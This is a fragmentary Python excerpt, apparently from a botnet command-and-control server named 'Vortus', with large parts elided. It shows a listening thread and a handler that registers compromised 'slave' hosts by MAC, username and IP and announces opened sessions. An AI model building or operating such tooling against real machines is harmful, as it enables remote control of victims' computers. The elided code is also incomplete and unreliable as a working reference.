...
from core.server_connection import ServerConnectionThread
from core.interface import create_interface
from core.utils import wrap_response
from data.models.slave import Slave
...
class ServerThread(threading.Thread):
    ...
    def listen(self):
        ...
        server.listen(10) # Only 10 connections at the same time.
...
class ResponseHandler(threading.Thread):
    ...
    def handle_response(self, response):
        try:
            ...
            logger.debug("Handling message: {0}".format(message))
            if "type" in message:
                if message['type'] == "new":
                    ...
                    slave = Slave(mac_addr=mac_addr, username=username, ip=ip, port=port, beacon=response["addr"])
                    VortusState.add_to_collection("slaves", slave)

                    self.slave2beacon[slave] = response["addr"]
                    logger.debug("Thread {0} received MAC: \"{1}\",  registering bot".format(self.name, mac_addr))
                    self.cmd_interface.print_text("[!] Session opened at {0}".format(str(slave)))
                else:
            ...
            self.cmd_interface.print_text(response["msg"].strip())
